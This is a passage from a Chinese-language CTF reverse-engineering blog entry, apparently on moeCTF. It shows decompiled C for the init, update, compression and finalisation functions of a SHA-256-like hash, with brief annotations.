id="sub-401B66函数："><a href="#sub-401B66函数：" class="headerlink" title="sub_401B66函数："></a>sub_401B66函数：</h5><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_401B66</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">64</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">72</span>) = <span class="number">0</span>i64;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">80</span>) = <span class="number">0x6A09E667</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">84</span>) = <span class="number">0xBB67AE85</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">88</span>) = <span class="number">0x3C6EF372</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">92</span>) = <span class="number">0xA54FF53A</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">96</span>) = <span class="number">0x510E527F</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">100</span>) = <span class="number">0x9B05688C</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">104</span>) = <span class="number">0x1F83D9AB</span>;</span><br><span class="line">  result = a1;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">108</span>) = <span class="number">0x5BE0CD19</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1674561872919-373b04d3-1a22-4397-b8f6-34fa0ea22cb8.png"                      alt="image.png"                ><br>这里将数值都换成了16进制的情况</p><h5 id="sub-401BE0函数"><a href="#sub-401BE0函数" class="headerlink" title="sub_401BE0函数"></a>sub_401BE0函数</h5><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_401BE0</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a1 + (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(a1 + <span class="number">64</span>))++) = *(_BYTE *)(a2 + i);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">64</span>) == <span class="number">64</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401710(a1, a1);</span><br><span class="line">      *(_QWORD *)(a1 + <span class="number">72</span>) += <span class="number">512</span>i64;</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">64</span>) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1674562219271-b9ad196e-139a-45e1-a416-c0cd08da5761.png"                      alt="image.png"                ></p><h6 id="sub-401710函数"><a href="#sub-401710函数" class="headerlink" title="sub_401710函数"></a>sub_401710函数</h6><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">sub_401710</span><span class="params">(_DWORD *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+100h] [rbp+80h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+104h] [rbp+84h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+108h] [rbp+88h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+10Ch] [rbp+8Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+110h] [rbp+90h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+114h] [rbp+94h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+118h] [rbp+98h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+11Ch] [rbp+9Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+120h] [rbp+A0h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+124h] [rbp+A4h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+128h] [rbp+A8h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+12Ch] [rbp+ACh]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3[i++] = (*(<span class="type">unsigned</span> __int8 *)(v6 + <span class="number">2</span> + a2) &lt;&lt; <span class="number">8</span>) | (*(<span class="type">unsigned</span> __int8 *)(v6 + <span class="number">1</span> + a2) &lt;&lt; <span class="number">16</span>) | (*(<span class="type">unsigned</span> __int8 *)(a2 + v6) &lt;&lt; <span class="number">24</span>) | *(<span class="type">unsigned</span> __int8 *)(v6 + <span class="number">3</span> + a2);</span><br><span class="line">    v6 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( i &lt;= <span class="number">0x3F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3[i] = v3[i - <span class="number">16</span>]+ (__ROL4__(v3[i - <span class="number">15</span>], <span class="number">14</span>) ^ __ROR4__(v3[i - <span class="number">15</span>], <span class="number">7</span>) ^ ((<span class="type">unsigned</span> <span class="type">int</span>)v3[i - <span class="number">15</span>] &gt;&gt; <span class="number">3</span>))</span><br><span class="line">          + v3[i - <span class="number">7</span>]+ (((<span class="type">unsigned</span> <span class="type">int</span>)v3[i - <span class="number">2</span>] &gt;&gt; <span class="number">10</span>) ^ __ROL4__(v3[i - <span class="number">2</span>], <span class="number">13</span>) ^ __ROL4__(v3[i - <span class="number">2</span>], <span class="number">15</span>));</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = a1[<span class="number">20</span>];</span><br><span class="line">  v14 = a1[<span class="number">21</span>];</span><br><span class="line">  v13 = a1[<span class="number">22</span>];</span><br><span class="line">  v12 = a1[<span class="number">23</span>];</span><br><span class="line">  v11 = a1[<span class="number">24</span>];</span><br><span class="line">  v10 = a1[<span class="number">25</span>];</span><br><span class="line">  v9 = a1[<span class="number">26</span>];</span><br><span class="line">  v8 = a1[<span class="number">27</span>];</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x3F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (v10 &amp; v11 ^ v9 &amp; ~v11) <span class="comment">//~取反</span></span><br><span class="line">       + (__ROL4__(v11, <span class="number">7</span>) ^ __ROR4__(v11, <span class="number">11</span>) ^ __ROR4__(v11, <span class="number">6</span>))</span><br><span class="line">       + v8</span><br><span class="line">       + dword_405120[i]</span><br><span class="line">       + v3[i];</span><br><span class="line">    v4 = (__ROL4__(v15, <span class="number">10</span>) ^ __ROR4__(v15, <span class="number">13</span>) ^ __ROR4__(v15, <span class="number">2</span>)) + (v15 &amp; (v13 ^ v14) ^ v13 &amp; v14);</span><br><span class="line">    v8 = v9;</span><br><span class="line">    v9 = v10;</span><br><span class="line">    v10 = v11;</span><br><span class="line">    v11 = v12 + v5;</span><br><span class="line">    v12 = v13;</span><br><span class="line">    v13 = v14;</span><br><span class="line">    v14 = v15;</span><br><span class="line">    v15 = v5 + v4;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[<span class="number">20</span>] += v15;</span><br><span class="line">  a1[<span class="number">21</span>] += v14;</span><br><span class="line">  a1[<span class="number">22</span>] += v13;</span><br><span class="line">  a1[<span class="number">23</span>] += v12;</span><br><span class="line">  a1[<span class="number">24</span>] += v11;</span><br><span class="line">  a1[<span class="number">25</span>] += v10;</span><br><span class="line">  a1[<span class="number">26</span>] += v9;</span><br><span class="line">  result = a1;</span><br><span class="line">  a1[<span class="number">27</span>] += v8;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h5 id="sub-401C7D函数"><a href="#sub-401C7D函数" class="headerlink" title="sub_401C7D函数"></a>sub_401C7D函数</h5><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">sub_401C7D</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = *(_DWORD *)(a1 + <span class="number">64</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0x37</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = v5 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(a1 + *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">64</span>)) = <span class="number">0x80</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v7 &lt;= <span class="number">0x3F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v7++;</span><br><span class="line">      *(_BYTE *)(a1 + v3) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401710(a1, a1);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">void</span> *)a1, <span class="number">0</span>, <span class="number">0x38</span>ui64);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v5 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(a1 + *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">64</span>)) = <span class="number">0x80</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v6 &lt;= <span class="number">0x37</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = v6++;</span><br><span class="line">      *(_BYTE *)(a1 + v2) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">72</span>) += (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">8</span> * *(_DWORD *)(a1 + <span class="number">64</span>));</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">63</span>) = *(_QWORD *)(a1 + <span class="number">72</span>);</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">62</span>) = BYTE1(*(_QWORD *)(a1 + <span class="number">72</span>));</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">61</span>) = BYTE2(*(_QWORD *)(a1 + <span class="number">72</span>));</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">60</span>) = BYTE3(*(_QWORD *)(a1 + <span class="number">72</span>));</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">59</span>) = BYTE4(*(_QWORD *)(a1 + <span class="number">72</span>));</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">58</span>) = (<span class="type">unsigned</span> __int16)WORD2(*(_QWORD *)(a1 + <span class="number">72</span>)) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">57</span>) = BYTE6(*(_QWORD *)(a1 + <span class="number">72</span>));</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">56</span>) = HIBYTE(*(_QWORD *)(a1 + <span class="number">72</span>));</span><br><span class="line">  result = (_BYTE *)sub_401710(a1, a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 + i) = *(_DWORD *)(a1 + <span class="number">80</span>) &gt;&gt; (<span class="number">-8</span> * i + <span class="number">24</span>);</span><br><span class="line">    *(_BYTE *)(i + <span class="number">4</span> + a2) = *(_DWORD *)(a1 + <span class="number">84</span>) &gt;&gt; (<span class="number">-8</span> * i + <span class="number">24</span>);</span><br><span class="line">    *(_BYTE *)(i + <span class="number">8</span> + a2) = *(_DWORD *)(a1 + <span class="number">88</span>) &gt;&gt; (<span class="number">-8</span> * i + <span class="number">24</span>);</span><br><span class="line">    *(_BYTE *)(i + <span class="number">12</span> + a2) = *(_DWORD *)(a1 + <span class="number">92</span>) &gt;&gt; (<span class="number">-8</span> * i + <span class="number">24</span>);</span><br><span class="line">    *(_BYTE *)(i + <span class="number">16</span> + a2) = *(_DWORD *)(a1 + <span class="number">96</span>) &gt;&gt; (<span class="number">-8</span> * i + <span class="number">24</span>);</span><br><span class="line">    *(_BYTE *)(i + <span class="number">20</span> + a2) = *(_DWORD *)(a1 + <span class="number">100</span>) &gt;&gt; (<span class="number">-8</span> * i + <span class="number">24</span>);</span><br><span class="line">    *(_BYTE *)(i + <span class="number">24</span> + a2) = *(_DWORD *)(a1 + <span class="number">104</span>) &gt;&gt; (<span class="number">-8</span> * i + <span class="number">24</span>);</span><br><span class="line">    result = (_BYTE *)(i + <span class="number">28</span> + a2);</span><br><span class="line">    *result = *(_DWORD *)(a1 + <span class="number">108</span>) &gt;&gt; (<span class="number">-8</span> * i + <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1674562644209-321ef9c4-aaf7-4ded-b964-5e6550c9d949.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/moeCTF20221114.assets/1674562630263-31048179-8173-4ae2-88ba-d10fa4c17974.png"                      alt="image.png"                ><br>这个函数中也有指向sub_401710的函数</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="ctf_Replay" scheme="https://juana-2u.github.io/tags/ctf-Replay/"/>
    
  </entry>
  
</feed>
